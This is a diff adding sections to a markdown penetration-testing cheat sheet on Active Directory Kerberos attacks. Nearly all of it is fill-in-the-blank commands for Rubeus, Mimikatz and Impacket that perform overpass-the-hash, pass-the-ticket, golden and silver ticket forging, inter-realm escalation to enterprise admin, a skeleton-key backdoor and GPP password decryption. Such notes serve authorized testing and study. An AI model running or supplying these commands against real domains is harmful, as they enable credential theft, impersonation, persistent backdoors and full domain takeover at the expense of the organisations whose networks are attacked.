@@ -130,3 +130,108 @@ rubeus purge
 ```
 kerberos::purge
 ```
+### Pass the key (PTK)/Overpass the hash (OPTH)
+- Pass the key or pass the hash to obtain a TGT
+#### Rubeus
+```
+rubeus asktgt /domain:<DOMAIN> /user:<USER> /rc4:<HASH> /ptt
+```
+#### Mimikatz
+```
+sekurlsa::pth /user:<USER> /domain:<DOMAIN> /rc4:<HASH> /run:<CMD.EXE_OR_POWERSHELL.EXE>
+```
+#### Impacket (remote)
+```
+impacket-GetTGT <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -hashes <HASHES> export KRB5CCNAME=<TICKET>.ccache
+```
+### Pass the ticket (PTT)
+- Can either pass the TGT or pass the TGS
+- Dump the ticket to be passed (see harvest tickets above)
+	- for mimikatz export the tickets with sekurlsa::tickets /export
+#### Rubeus
+```
+rubeus ptt /ticket:<TICKET>
+```
+#### Mimikatz
+```
+kerberos::ptt <TICKET>
+#Verify with klist to list the cached tickets
+```
+#### Impacket
+```
+export KRB5CCNAME=<TICKET>.ccache
+```
+### Golden/Silver Ticket
+- golden ticket
+	- Create forged TGT for domain admin using admin's hash
+- Silver Ticket
+	- Create forged TGS for service using service's hash 
+		- this is useful for impersonating users when logging into a service
+		- Has the same effect as requesting a TGT or TGS but without communicating with the DC
+		- You can create it for any user, even one that doesn't exist
+#### Mimikatz
+- Get domain SID
+```
+wmic useraccount get name,sid
+```
+- Current realm
+```
+kerberos::golden /user:<ANYTHING> /id:<ANYTHING> /domain: /sid:<DC_SID> /krbtgt: <NTLM_HASH> /ptt
+```
+```
+# use /service:<SPN> for a silver ticket
+```
+- Inter-Realm
+```
+kerberos::golden /user:<ANYTHING> /id:<ANYTHING> /domain:<DOMAIN> /sid:<CHILD_DC_SID> /krbtgt:<NTLM_HASH> /service:krbtgt /sids:<ENTERPRISE_ADMIN_GROUP_SID>
+```
+#### Impacket
+- Get domain SID
+```
+impacket-getPac -targetUser Administrator <DOMAIN>/<USER>:<PASSWORD>
+```
+```
+crackmapexec ldap <DC> -u <USER> -p <PASSWORD> -k --get-sid
+```
+- current realm
+```
+impacket-ticketer -domain <DOMAIN> -domain-sid <SID> -nthash <KRBTGT_HASH> Administrator
+```
+```
+#For another user replace Administrator with -user-id <ID> <USER>
+# use -spn <SPN> for silver ticket
+export KRB5CCNAME=<TICKET>.ccache
+```
+- Inter-Realm
+- Manual
+```
+impacket-ticketer -domain <DOMAIN> -domain-sid <SID> -nthash <KRBTGT_HASH> -spn krbtgt -extra-sid <ENTERPRISE_ADMIN_GROUP_SID> export KRB5CCNAME=<TICKET>.ccache
+```
+- Automatically
+```
+impacket-raiseChild <DOMAIN>/<USER>:<PASSWORD> -w <TICKET> -target-exec <HOST>
+```
+```
+#-w writes out the golden ticket
+#-target-exec <HOST> ps exec to host after compromise
+```
+### Skeletonkey
+- Used to access any SMB share with the same password
+```
+misc::skeleton
+```
+- Default password is mimikatz
+### Group Policy Preferences (GPP)
+- Patched in MS14-025
+- Locally
+```
+C:\Windows\SYSVOL\Preferences\Groups\Groups.xml
+```
+- On a domain controller copy the cpassword from cpassword annotation
+```
+gpp-decrypt <CPASSWORD>
+```
+- Impacket
+```
+impacket-Get-GPPPassword <DOMAIN>/<USER>:<PASSWORD>@<DC> -xmlfile <GROUPS.SML_FILE> local # parses local xml file
+```
